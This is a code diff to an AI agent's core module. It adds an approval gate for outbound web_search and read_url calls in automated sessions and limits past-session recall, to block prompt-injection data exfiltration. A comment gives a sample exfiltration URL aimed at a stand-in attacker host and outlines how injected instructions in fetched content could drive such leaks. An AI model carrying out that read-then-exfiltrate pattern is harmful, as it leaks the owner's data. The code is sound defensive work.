@@ -19,6 +19,7 @@ import sys
 import tempfile
 import threading
 import time
+import urllib.parse
 import weakref
 from collections.abc import Callable, Mapping
 from concurrent.futures import ThreadPoolExecutor
@@ -562,6 +563,46 @@ READ_ONLY_TOOLS = frozenset(
     {"read_docs", "read_skill", "web_search", "read_url", "read_file", "recall"}
 )
 
+# Origin-gated egress (#178 P0-2): read-only for the local machine, but their
+# INPUTS leave it — a read_url("https://attacker/?d=<data>") is an outbound
+# send. In a non-user (triggered) session, a call reaching a host the owner
+# never introduced holds on an approval card instead of auto-running; in a
+# user session (all CLI sessions, every hand-started web chat) nothing changes.
+EGRESS_TOOLS = frozenset({"web_search", "read_url"})
+
+# URL or bare-domain-looking tokens in owner text. Deliberately generous
+# (matches "setup.py"-shaped tokens too): over-inclusion only ever widens
+# provenance with strings the owner literally typed, while under-inclusion
+# would nag about a host the owner plainly named.
+_HOST_TOKEN_RE = re.compile(
+    r"(?i)(?:https?://([^\s/\"'<>]+)|\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})\b)"
+)
+
+EGRESS_DENIED = (
+    "USER DENIED this outbound call — it was NOT executed. "
+    "Do not retry it; change approach or ask the user."
+)
+
+EGRESS_NO_APPROVER = (
+    "NOT EXECUTED: this automated session cannot reach {host} — the host was "
+    "not mentioned by the owner and no approver is available. Work with hosts "
+    "the owner named, or finish and report."
+)
+
+
+def _hosts_in_text(text: str) -> set[str]:
+    """Lowercased hostnames mentioned in owner-authored text (full URLs or
+    bare domain-looking tokens)."""
+    hosts: set[str] = set()
+    for url_host, bare in _HOST_TOKEN_RE.findall(text or ""):
+        token = (url_host or bare).lower()
+        # A URL netloc may carry userinfo/port — keep only the host part.
+        token = token.rsplit("@", 1)[-1].split(":", 1)[0].strip(".")
+        if token:
+            hosts.add(token)
+    return hosts
+
+
 def format_secs(seconds: float) -> str:
     if seconds < 60:
         return f"{seconds:.1f}s"
@@ -698,8 +739,22 @@ class Agent:
         aliases: Mapping[str, str] | None = None,
         approve_tool: Callable[..., Any] | None = None,
         approve_import: Callable[..., Any] | None = None,
+        origin: str = "user",
     ):
         self.model = model
+        # Session provenance (#160/#178): "user" for every CLI session and
+        # every web chat a human started; "schedule"/"email"/"webhook" for
+        # triggered sessions, set by the server's open_session. A non-user
+        # origin gates outbound reads (web_search/read_url to hosts the owner
+        # never mentioned — see _egress_gate) and scopes recall to knowledge
+        # entries only.
+        self.origin = origin
+        # Hosts the OWNER introduced: extracted from user-typed / trigger-
+        # prompt text (never from tool results or fetched pages) plus hosts
+        # explicitly approved on an egress card this session. Only consulted
+        # when origin != "user".
+        self._owner_hosts: set[str] = set()
+        self._approved_hosts: set[str] = set()
         self.provider = "ollama"  # callers overwrite after construction (cli/server)
         self.task_sources: list[dict] = []  # pages read_url fetched for the current task
         self.approve = approve
@@ -847,6 +902,13 @@ class Agent:
         """Adopt messages from a previous session (already logged — appended
         directly so they are not re-recorded)."""
         self.messages.extend(m for m in messages if m.get("role") != "system")
+        # Restore egress provenance (#178): user-role turns are owner-authored
+        # by construction (typed messages, the trigger prompt, aish's own
+        # notes) — tool results stay excluded, so a cold reopen neither widens
+        # nor narrows what the live session had granted from owner text.
+        for message in messages:
+            if message.get("role") == "user" and isinstance(message.get("content"), str):
+                self.note_owner_hosts(message["content"])
 
     def rewind_last_task(self) -> str | None:
         """Undo the most recent user turn: drop that user message and everything
@@ -1023,6 +1085,7 @@ class Agent:
             # No echo line — the `injected` step ("You added" note) is the sole,
             # clean timeline marker for this (#95); a grey echo would duplicate it.
             self._emit_step(kind="injected", text=msg)
+            self.note_owner_hosts(msg)  # steering is owner-typed (#178)
             self.messages.append({"role": "user", "content": msg})
 
     def run_task(
@@ -1061,6 +1124,10 @@ class Agent:
         else:
             for message in self.messages[1:task_start]:
                 self._trim_tool_message(message)
+
+        # Task text is owner-authored (a typed message or the trigger prompt),
+        # so its hosts enter egress provenance (#178 P0-2).
+        self.note_owner_hosts(task)
 
         # Media rides on the user message as file paths; each backend encodes
         # them for its API (ollama `images`, data URLs, Anthropic blocks).
@@ -1456,6 +1523,7 @@ class Agent:
         the terminal I/O is otherwise private to the terminal. The caller's
         `[…]` framing keeps the logged turn out of the replayed transcript, which
         is where the live UI leaves it too (session.synthetic_kind, #171)."""
+        self.note_owner_hosts(text)  # user-shared context is owner-authored
         self._append({"role": "user", "content": text})
 
     def rebase(self, target: str, announce: bool = True) -> str:
@@ -1706,6 +1774,18 @@ class Agent:
         return tool_plugins.execute(tool, args, cwd=self.cwd)
 
     def _recall(self, query: str, name: str | None) -> str:
+        if self.origin != "user":
+            # A triggered session must not search the whole past-session
+            # archive (#178 P0-2): recall over every conversation ever held is
+            # a far larger read capability than this unattended task needs,
+            # and it is the read half of the injected read→exfiltrate chain.
+            # Knowledge entries (skills/memories) stay available.
+            return (
+                skills.recall_text(self.cwd, self.lessons_path, query, name=name)
+                + "\n\n(Past-session archive search is unavailable in automated "
+                "sessions — only saved skills and memory were searched. Do not "
+                "retry with session names.)"
+            )
         if self.state_dir is None:
             return skills.recall_text(self.cwd, self.lessons_path, query, name=name)
         state_dir = Path(self.state_dir)
@@ -1738,8 +1818,74 @@ class Agent:
         self.task_sources.append(source)
 
     def _read_needs_prompt(self, name: str, args: dict) -> bool:
-        path = str(args.get("path", ""))
-        return name == "read_file" and self._read_prompt_reason(path) is not None
+        if name == "read_file":
+            return self._read_prompt_reason(str(args.get("path", ""))) is not None
+        # Egress calls needing an approval card (#178 P0-2) must run through
+        # _dispatch sequentially — the parallel thunks would bypass the gate.
+        return self._egress_novel_hosts(name, args) is not None
+
+    def _egress_novel_hosts(self, name: str, args: dict) -> list[str] | None:
+        """Hosts this call would reach that the owner never introduced, or
+        None when the call needs no gate (user-origin session, non-egress
+        tool, or every host already in provenance). Provenance = hosts from
+        owner-authored text (_owner_hosts) + hosts approved on an earlier
+        egress card (_approved_hosts) — hosts that first appeared in tool
+        results or fetched pages deliberately do NOT qualify, since those are
+        exactly what an injected instruction controls."""
+        if self.origin == "user" or name not in EGRESS_TOOLS:
+            return None
+        if name == "read_url":
+            url = str(args.get("url", ""))
+            try:
+                host = (urllib.parse.urlsplit(url).hostname or "").lower()
+            except ValueError:
+                host = ""
+            if not host:
+                return [url.strip() or "(no url)"]  # unparseable → fail closed
+            hosts = {host}
+        else:  # web_search: the query itself is the outbound payload; gate on
+            # any host/URL it names (a host-free query names no novel host).
+            hosts = _hosts_in_text(str(args.get("query", "")))
+        known = self._owner_hosts | self._approved_hosts
+        novel = sorted(h for h in hosts if h not in known)
+        return novel or None
+
+    def _egress_gate(self, name: str, args: dict) -> str | None:
+        """Approval gate for outbound reads in a triggered session (#178
+        P0-2): None = proceed, else the refusal/hold text for the model. Runs
+        through the same approve_tool channel (and Bridge.ask path) as
+        mutating plugin tools, so the card, the audit record, and the
+        no-viewer push notification all come for free; verdict semantics
+        mirror _dispatch_plugin_tool (#81) exactly."""
+        novel = self._egress_novel_hosts(name, args)
+        if novel is None:
+            return None
+        shown = ", ".join(novel)
+        if self.approve_tool is None:
+            return EGRESS_NO_APPROVER.format(host=shown)
+        preview = (
+            f"automated session wants to reach {shown} — a host not "
+            "mentioned by the owner in this conversation"
+        )
+        decision = self.approve_tool(name, args, preview)
+        if isinstance(decision, Denied):
+            self._arm_stop_gate(decision.comment)
+            return _with_feedback(EGRESS_DENIED, decision.comment)
+        if isinstance(decision, Approved):
+            return TOOL_HELD_FOR_ADJUSTMENT.format(name=name, comment=decision.comment)
+        if decision is None or decision is False:
+            return EGRESS_DENIED
+        # Plain approve: the owner vouched for these hosts for the rest of
+        # this session, so the same host does not re-prompt every step.
+        self._approved_hosts.update(novel)
+        return None
+
+    def note_owner_hosts(self, text: str) -> None:
+        """Fold hosts from owner-authored text into egress provenance. Called
+        only for text the OWNER supplied (task prompts, mid-task steering,
+        shared context) — never for tool results or fetched content."""
+        if self.origin != "user":
+            self._owner_hosts |= _hosts_in_text(text)
 
     def _read_prompt_reason(self, path: str) -> str | None:
         """Why an otherwise auto-approved read_file must prompt, or None."""
@@ -1843,6 +1989,11 @@ class Agent:
             return thunk()
 
         if name in READ_ONLY_TOOLS:
+            # Outbound reads in a triggered session hold for approval when
+            # they reach beyond the owner's own hosts (#178 P0-2).
+            refusal = self._egress_gate(name, args)
+            if refusal is not None:
+                return refusal
             label, thunk = self._read_only_call(name, args)
             self._note(label)
             self.status.start(name)
